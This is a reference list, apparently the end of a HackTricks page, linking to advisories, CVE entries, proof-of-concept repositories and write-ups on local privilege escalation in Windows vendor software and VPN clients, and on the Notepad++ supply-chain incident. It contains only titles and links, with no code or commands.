- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
